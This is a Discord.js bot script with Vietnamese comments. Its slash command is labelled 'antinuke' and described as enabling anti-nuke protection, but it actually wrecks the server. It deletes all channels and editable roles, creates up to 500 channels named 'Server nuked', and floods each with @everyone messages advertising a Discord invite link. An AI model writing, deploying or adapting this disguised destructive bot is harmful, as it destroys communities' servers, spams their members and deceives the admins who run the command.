import {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  ChannelType
} from "discord.js";
import "dotenv/config";

/* ===== GLOBAL CRASH SHIELD ===== */
process.on("unhandledRejection", err => console.error("🔥 Promise:", err));
process.on("uncaughtException", err => console.error("🔥 Exception:", err));
/* ============================== */

const client = new Client({
  intents: [GatewayIntentBits.Guilds]
});

const sleep = ms => new Promise(r => setTimeout(r, ms));

/* ===== CONFIG ===== */
const CHANNEL_NAME = "Server nuked";
const CREATE_COUNT = 500;
const MSG_PER_CHANNEL = 5;
const DELETE_DELAY = 80;
const CREATE_BATCH = 4; // an toàn cho Railway
/* ================== */

/* ===== Slash Command ===== */
const commands = [
  new SlashCommandBuilder()
    .setName("antinuke")
    .setDescription("Bật Anti Nuke")
].map(cmd => cmd.toJSON());

const rest = new REST({ version: "10" }).setToken(process.env.BOT_TOKEN);

(async () => {
  try {
    console.log("🔁 Register slash...");
    await rest.put(
      Routes.applicationCommands(process.env.CLIENT_ID),
      { body: commands }
    );
    console.log("✅ Slash OK");
  } catch (e) {
    console.error("Slash error:", e);
  }
})();

client.once("ready", () => {
  console.log(`🤖 Online ${client.user.tag} | Shard ${client.shard.ids[0]}`);
});

client.on("interactionCreate", async interaction => {
  try {
    if (!interaction.isChatInputCommand()) return;
    if (interaction.commandName !== "antinuke") return;

    const guild = interaction.guild;
    await interaction.reply({ content: "⚠️ Đang xử lý...", ephemeral: true });

    const controlChannel = await guild.channels.create({
      name: "control",
      type: ChannelType.GuildText
    });

    await controlChannel.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");

    /* ===== XOÁ CHANNEL ===== */
    for (const ch of [...guild.channels.cache.values()]) {
      if (ch.id === controlChannel.id) continue;
      try {
        await ch.delete();
        await sleep(DELETE_DELAY);
      } catch (e) {
        console.log("Delete channel fail:", ch.id);
      }
    }

    /* ===== XOÁ ROLE ===== */
    const botRolePos = guild.members.me.roles.highest.position;
    const roles = [...guild.roles.cache.values()]
      .filter(r => r.editable && r.name !== "@everyone" && r.position < botRolePos);

    for (const role of roles) {
      try {
        await role.delete();
        await sleep(DELETE_DELAY);
      } catch (e) {
        console.log("Delete role fail:", role.id);
      }
    }

    /* ===== TẠO KÊNH + GỬI TIN ===== */
    for (let i = 0; i < CREATE_COUNT; i += CREATE_BATCH) {
      const batch = [];

      for (let j = 0; j < CREATE_BATCH && i + j < CREATE_COUNT; j++) {
        batch.push(
          (async () => {
            try {
              const ch = await guild.channels.create({
                name: CHANNEL_NAME,
                type: ChannelType.GuildText
              });

              for (let k = 0; k < MSG_PER_CHANNEL; k++) {
                try {
                  await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
                } catch {}
              }
            } catch {}
          })()
        );
      }

      await Promise.allSettled(batch);
    }

    await controlChannel.send("✅ Hoàn tất.");
  } catch (e) {
    console.error("🔥 Handler crash:", e);
  }
});

client.login(process.env.BOT_TOKEN);
